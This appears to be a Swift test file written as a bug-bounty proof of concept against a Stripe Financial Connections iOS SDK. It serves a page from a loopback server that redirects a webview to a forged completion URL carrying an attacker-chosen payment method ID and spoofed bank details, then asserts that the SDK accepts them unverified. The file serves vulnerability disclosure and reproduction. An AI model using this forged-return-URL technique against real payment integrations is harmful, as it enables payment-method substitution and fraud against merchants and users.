//
//  FCLiteInstantDebitsForgedReturnURLTests.swift
//
//  PoC (bug bounty /reports/4119988): instant-debits completion trusts
//  unsigned, attacker-forgeable return-URL query parameters.
//
//  This test demonstrates, with a REAL network navigation in a REAL WKWebView:
//    1. An external origin (loopback HTTP server standing in for a compromised
//       or malicious page inside the FinancialConnections auth context) serves
//       a document that navigates the webview to a forged completion URL.
//    2. The SDK's navigation guard (`matchesSchemeHostAndPath`) accepts it
//       because query parameters are deliberately excluded from the comparison
//       (`URL+MatchesSchemeHostAndPath.swift:11-17`).
//    3. The forged `payment_method` / `bank_name` / `last4` query values are
//       extracted verbatim with no signature, MAC, or session cross-check
//       (`URL+LinkBankPaymentMethod.swift:21-31`) - the exact values that
//       `FCLiteContainerViewController.createInstantDebitsLinkedBank` feeds
//       into `completion(.completed(.instantDebits(...)))`.
//
//  The success_url shape (`stripe-auth://link-accounts/success`) is taken from
//  a live test-mode `financial_connections/sessions/synchronize` manifest
//  (product=instant_debits) captured 2026-10-18; the server appends the
//  completion query parameters that this test forges.
//
//  Pinned analysis commit: 1b2376b64722b2188f230ef40b070227b558270a
//

import Network
import WebKit
import XCTest

@_spi(STP) import StripeCore
@testable @_spi(STP) import StripeFinancialConnectionsLite

enum FCLitePoCError: Error {
    case serverStartTimeout
    case serverStartFailed(NWListener.State)
}

final class FCLiteInstantDebitsForgedReturnURLTests: XCTestCase {

    /// Base64({"id": "pm_ATTACKER_CHOSEN", "object": "payment_method", "livemode": false})
    private let attackerPMB64 =
        "eyJpZCI6ICJwbV9BVFRBQ0tFUl9DSE9TRU4iLCAib2JqZWN0IjogInBheW1lbnRfbWV0aG9kIiwgImxpdmVtb2RlIjogZmFsc2V9"

    private var server: LoopbackHTTPServer?
    private var window: UIWindow?

    override func tearDown() {
        server?.stop()
        server = nil
        window?.isHidden = true
        window = nil
        super.tearDown()
    }

    // MARK: - Network-backed WebKit reproduction

    func testForgedCompletionURLAcceptedAfterRealNetworkNavigation() throws {
        // The forged completion URL: real server-issued scheme/host/path + attacker query.
        let forgedSuccessURL =
            "stripe-auth://link-accounts/success" +
            "?payment_method=\(attackerPMB64)&bank_name=Chase&last4=9999&incentive_eligible=true"

        // The external origin's document autonomously navigates the webview to it.
        let html = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>PoC</title></head>
        <body>
        <script>
          location.replace("\(forgedSuccessURL)");
        </script>
        </body></html>
        """

        let server = try LoopbackHTTPServer(body: html)
        try server.start()
        self.server = server

        // Manifest with the real instant-debits success_url shape; hosted auth URL
        // points at the loopback server (standing in for the page loaded in the
        // FinancialConnections auth context).
        let manifestJSON: [String: Any] = [
            "id": "fcsess_poc_001",
            "hosted_auth_url": "http://127.0.0.1:\(server.port)/auth",
            "success_url": "stripe-auth://link-accounts/success",
            "cancel_url": "stripe-auth://link-accounts/cancel",
            "product": "instant_debits",
            "manual_entry_uses_microdeposits": false,
        ]
        let manifest = try JSONDecoder().decode(
            LinkAccountSessionManifest.self,
            from: JSONSerialization.data(withJSONObject: manifestJSON)
        )
        XCTAssertTrue(manifest.isInstantDebits, "precondition: instant-debits manifest")

        let completionExpectation = expectation(description: "FCLite completion fires")
        var received: FCLiteWebFlowResult?

        let vc = FCLiteAuthFlowViewController(
            manifest: manifest,
            elementsSessionContext: nil,
            returnUrl: nil,
            onLoad: {},
            completion: { result in
                received = result
                completionExpectation.fulfill()
            }
        )

        let window = UIWindow(frame: CGRect(x: 0, y: 0, width: 390, height: 844))
        window.rootViewController = UINavigationController(rootViewController: vc)
        window.makeKeyAndVisible()
        self.window = window
        vc.loadViewIfNeeded()

        wait(for: [completionExpectation], timeout: 30)

        guard case .success(let returnUrl)? = received else {
            XCTFail("Expected .success(returnUrl:) from forged navigation, got: \(String(describing: received))")
            return
        }

        print("[PoC] completion fired with returnUrl: \(returnUrl.absoluteString)")

        // 1. The forged URL passes the SDK's completion guard (query never compared).
        XCTAssertTrue(
            returnUrl.matchesSchemeHostAndPath(of: manifest.successURL),
            "forged URL should pass matchesSchemeHostAndPath"
        )

        // 2. The unsigned base64 payment_method decodes to the attacker's id.
        let pm = try returnUrl.extractLinkBankPaymentMethod()
        XCTAssertEqual(pm?.id, "pm_ATTACKER_CHOSEN", "attacker-chosen PM id accepted verbatim")

        // 3. Display-spoofing values are accepted verbatim.
        XCTAssertEqual(returnUrl.extractQueryValue(forKey: "bank_name"), "Chase")
        XCTAssertEqual(returnUrl.extractQueryValue(forKey: "last4"), "9999")
        XCTAssertEqual(returnUrl.extractQueryValue(forKey: "incentive_eligible"), "true")

        // 4. This is the exact URL FCLiteContainerViewController.completeFlow
        //    (isInstantDebits branch, lines 118-131) would pass to
        //    createInstantDebitsLinkedBank -> completion(.completed(.instantDebits(...)))
        //    WITHOUT calling fetchSessionAndComplete()/sessionReceipt.
        print("[PoC] PASS: forged completion accepted end-to-end from real network navigation")
    }

    // MARK: - Decode-path checks (URL+MatchesSchemeHostAndPath / URL+LinkBankPaymentMethod)

    func testForgedURLQueryExtractionMatchesSDKDecisionPath() throws {
        let manifestSuccessURL = URL(string: "stripe-auth://link-accounts/success")!
        let forged = URL(string:
            "stripe-auth://link-accounts/success" +
            "?payment_method=\(attackerPMB64)&bank_name=Chase&last4=9999&incentive_eligible=true"
        )!

        XCTAssertTrue(forged.matchesSchemeHostAndPath(of: manifestSuccessURL))
        XCTAssertEqual(try forged.extractLinkBankPaymentMethod()?.id, "pm_ATTACKER_CHOSEN")
        XCTAssertEqual(forged.extractQueryValue(forKey: "bank_name"), "Chase")
        XCTAssertEqual(forged.extractQueryValue(forKey: "last4"), "9999")

        // Control: a different path is rejected (guard is not vacuous).
        let wrongPath = URL(string: "stripe-auth://link-accounts/failure?payment_method=\(attackerPMB64)")!
        XCTAssertFalse(wrongPath.matchesSchemeHostAndPath(of: manifestSuccessURL))
    }
}

// MARK: - Minimal loopback HTTP server

/// Serves a single static document on 127.0.0.1 with an ephemeral port.
final class LoopbackHTTPServer {
    private let listener: NWListener
    private let body: Data
    private(set) var port: UInt16 = 0

    init(body: String) throws {
        self.body = Data(body.utf8)
        let params = NWParameters.tcp
        params.allowLocalEndpointReuse = true
        self.listener = try NWListener(using: params)
    }

    func start() throws {
        let ready = DispatchSemaphore(value: 0)
        var readyState: NWListener.State = .setup

        listener.stateUpdateHandler = { state in
            switch state {
            case .ready:
                ready.signal()
            case .failed(let error):
                print("[PoC] server failed: \(error)")
                ready.signal()
            default:
                break
            }
            readyState = state
        }

        listener.newConnectionHandler = { [body] connection in
            connection.start(queue: .global())
            connection.receive(minimumIncompleteLength: 1, maximumLength: 8192) { _, _, _, _ in
                let payload = Data((
                    "HTTP/1.1 200 OK\r\n" +
                    "Content-Type: text/html; charset=utf-8\r\n" +
                    "Content-Length: \(body.count)\r\n" +
                    "Connection: close\r\n\r\n"
                ).utf8) + body
                connection.send(content: payload, completion: .contentProcessed { _ in
                    connection.cancel()
                })
            }
        }

        listener.start(queue: .global())

        if ready.wait(timeout: .now() + 5) == .timedOut {
            throw FCLitePoCError.serverStartTimeout
        }
        guard listener.state == .ready else {
            throw FCLitePoCError.serverStartFailed(listener.state)
        }
        if let p = listener.port?.rawValue {
            port = p
        }
    }

    func stop() {
        listener.cancel()
    }
}
